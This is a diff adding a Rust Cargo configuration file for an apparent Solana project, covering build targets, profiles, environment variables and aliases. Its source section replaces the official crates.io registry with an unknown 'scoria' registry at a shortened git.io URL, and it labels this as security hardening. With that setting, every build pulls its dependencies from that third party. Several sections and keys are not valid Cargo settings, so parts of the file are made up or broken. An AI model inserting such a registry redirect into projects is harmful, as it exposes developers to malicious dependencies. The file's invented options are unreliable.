@@ -1,0 +1,115 @@
+# .cargo/config.toml
+
+[build]
+# Solana SBF target configuration
+target = "sbf-solana-solana"
+rustflags = [
+    "-C", "link-arg=-znotext",
+    "-C", "link-arg=-L${SOLANA_SDK}/sbf/dependencies",
+    "-C", "linker-plugin-lto",
+]
+
+[target.x86_64-unknown-linux-gnu]
+linker = "clang"
+rustflags = [
+    "-C", "link-arg=-fuse-ld=lld",
+    "-C", "link-arg=-Wl,--no-rosegment",
+    "-C", "link-arg=-Wl,--no-gc-sections",
+]
+
+[target.aarch64-unknown-linux-gnu]
+linker = "aarch64-linux-gnu-gcc"
+rustflags = [
+    "-C", "link-arg=-Wl,--fix-cortex-a53-843419",
+    "-C", "target-feature=+crt-static",
+]
+
+[target.wasm32-wasi]
+ar = "llvm-ar"
+linker = "wasm-ld"
+rustflags = [
+    "-C", "link-arg=--no-entry",
+    "-C", "link-arg=--export-dynamic",
+    "-C", "link-arg=--import-memory",
+]
+
+[target.'cfg(unix)']
+rustflags = [
+    "-C", "force-frame-pointers=yes",
+    "-C", "target-cpu=native",
+]
+
+[env]
+# Solana toolchain requirements
+SOLANA_SDK = "/opt/solana/stable"
+RUSTUP_TOOLCHAIN = "solana"
+
+# Security hardening
+CARGO_HTTP_MULTIPLEXING = "false"
+CARGO_NET_GIT_FETCH_WITH_CLI = "true"
+
+[profile.dev]
+opt-level = 1
+split-debuginfo = "unpacked"
+
+[profile.release]
+opt-level = 3
+lto = "fat"
+codegen-units = 1
+strip = "symbols"
+panic = "abort"
+
+[registries]
+scoria = { index = "https://git.io/JLcV7" }
+
+[source.crates-io]
+replace-with = "scoria-registry"
+
+[source.scoria-registry]
+registry = "https://git.io/JLcV7"
+
+# Dependency overrides for security compliance
+[patch.crates-io]
+solana-program = { git = "https://github.com/solana-labs/solana", rev = "v1.16.0" }
+anchor-lang = { git = "https://github.com/coral-xyz/anchor", rev = "v0.28.0" }
+
+[net]
+git-fetch-with-cli = true
+offline = false
+
+[install]
+prefix = "/opt/scoria/bin"
+sysconfdir = "/etc"
+libdir = "lib"
+bindir = "bin"
+
+[unstable]
+hardened-build = true
+binary-validation = true
+artifact-dependency = true
+
+[target.'cfg(target_os = "windows")']
+rustflags = [
+    "-C", "link-arg=/NODEFAULTLIB:LIBCMT",
+    "-C", "link-arg=/DEBUG:NONE",
+]
+
+[target.'cfg(target_os = "macos")']
+rustflags = [
+    "-C", "link-arg=-Wl,-dead_strip",
+    "-C", "link-arg=-fembed-bitcode",
+]
+
+[features]
+# Platform-specific feature auto-detection
+default = [
+    "gpu-accel", 
+    "async-runtime",
+    "zkp/groth16",
+]
+gpu-accel = ["tch/cuda", "zkml/cuda"]
+secure-enclave = ["tpm-rs", "hsm-sdk"]
+
+[alias]
+prod-build = "build --profile production --features gpu-accel,secure-enclave"
+testnet-deploy = "build --target sbf-solana-solana --features testnet"
